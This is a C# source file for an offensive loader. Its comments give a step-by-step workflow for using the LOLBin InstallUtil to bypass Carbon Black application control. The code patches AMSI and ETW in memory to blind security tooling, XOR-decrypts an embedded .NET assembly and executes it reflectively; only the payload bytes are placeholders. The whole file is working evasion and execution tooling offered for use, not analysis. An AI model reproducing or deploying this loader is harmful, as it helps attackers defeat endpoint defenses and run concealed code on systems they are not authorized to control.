// InstallUtil Payload — alternative LOLBin for Carbon Black bypass
//
// Workflow:
//   1. python encrypt_payload.py xor YourTool.exe --format cs
//   2. Paste byte arrays into the PAYLOAD SECTION below
//   3. Compile on your attack box (Mono works):
//        mcs -target:library -out:payload.dll installutil_payload.cs
//      Or with MinGW's .NET support / cross-compile with Mono:
//        mcs -target:library -r:System.Configuration.Install -out:payload.dll installutil_payload.cs
//   4. Transfer payload.dll to target
//   5. Run via InstallUtil (Microsoft-signed, whitelisted by CB):
//        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
//
// The /U flag calls the Uninstall() method. /logfile= suppresses the log file.
// InstallUtil is a .NET Framework utility, Microsoft-signed, and typically
// whitelisted by Carbon Black App Control.

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Payload
{
    [RunInstaller(true)]
    public class Loader : Installer
    {
        // P/Invoke
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static bool PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi == IntPtr.Zero) return false;
                IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
                if (addr == IntPtr.Zero) return false;
                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);
                uint tmp;
                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
                return true;
            }
            catch { return false; }
        }

        static bool PatchEtw()
        {
            try
            {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return false;
                IntPtr addr = GetProcAddress(hNtdll, "EtwEventWrite");
                if (addr == IntPtr.Zero) return false;
                byte[] patch = { 0x33, 0xC0, 0xC3 };
                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);
                uint tmp;
                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
                return true;
            }
            catch { return false; }
        }

        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            return result;
        }

        // ================================================================
        //  PAYLOAD SECTION — paste from encrypt_payload.py
        // ================================================================

        static byte[] encryptedAssembly = new byte[] {
            // PASTE ENCRYPTED ASSEMBLY BYTES HERE
            0x00  // placeholder
        };

        static byte[] xorKey = new byte[] {
            // PASTE XOR KEY HERE
            0x00  // placeholder
        };

        // ================================================================
        //  ARGUMENTS SECTION
        // ================================================================

        static string[] assemblyArgs = new string[] {
            // "-group=all",
        };

        // ================================================================
        //  Entry — called by InstallUtil /U
        // ================================================================

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            PatchEtw();
            PatchAmsi();

            byte[] clearAssembly = XorDecrypt(encryptedAssembly, xorKey);

            try
            {
                Assembly asm = Assembly.Load(clearAssembly);
                MethodInfo entry = asm.EntryPoint;

                if (entry != null)
                {
                    ParameterInfo[] parms = entry.GetParameters();
                    if (parms.Length == 0)
                        entry.Invoke(null, null);
                    else
                        entry.Invoke(null, new object[] { assemblyArgs });
                }
            }
            catch (TargetInvocationException ex)
            {
                Console.Error.WriteLine(ex.InnerException?.ToString());
            }
            finally
            {
                Array.Clear(clearAssembly, 0, clearAssembly.Length);
            }
        }
    }
}
